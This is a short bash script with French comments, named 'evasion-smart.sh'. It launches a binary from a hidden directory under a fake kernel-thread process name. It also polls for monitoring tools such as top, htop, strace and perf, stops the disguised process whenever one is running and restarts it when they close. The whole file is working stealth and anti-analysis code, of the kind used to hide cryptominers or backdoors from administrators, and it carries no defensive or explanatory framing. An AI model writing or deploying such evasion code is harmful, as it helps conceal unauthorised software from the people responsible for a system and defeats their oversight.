#!/bin/bash
# evasion-smart.sh

# Nom camouflé du processus à surveiller
PROCESS_NAME="[kworker/u8:3-events_power_efficient]"

# Chemin du binaire camouflé
PROCESS_CMD="/usr/local/.sysdaemon/syslogd"

# Liste des outils de surveillance à détecter
DETECTEURS=("top" "htop" "strace" "nmon" "perf")

# Fonction : détecte si un outil de surveillance est actif
detect_surveillance() {
  for tool in "${DETECTEURS[@]}"; do
    if pgrep -x "$tool" > /dev/null; then
      return 0
    fi
  done
  return 1
}

# Fonction : démarre le faux processus si absent
start_process() {
  if ! pgrep -f "$PROCESS_NAME" > /dev/null; then
    echo "[$(date)] Redémarrage du processus camouflé..."
    nohup bash -c "exec -a '$PROCESS_NAME' $PROCESS_CMD" >/dev/null 2>&1 &
  fi
}

# Fonction : tue le faux processus s’il tourne
stop_process() {
  if pgrep -f "$PROCESS_NAME" > /dev/null; then
    echo "[$(date)] Surveillance détectée, arrêt du processus..."
    pkill -f "$PROCESS_NAME"
  fi
}

# Boucle continue
while true; do
  if detect_surveillance; then
    stop_process
  else
    start_process
  fi
  sleep 5
done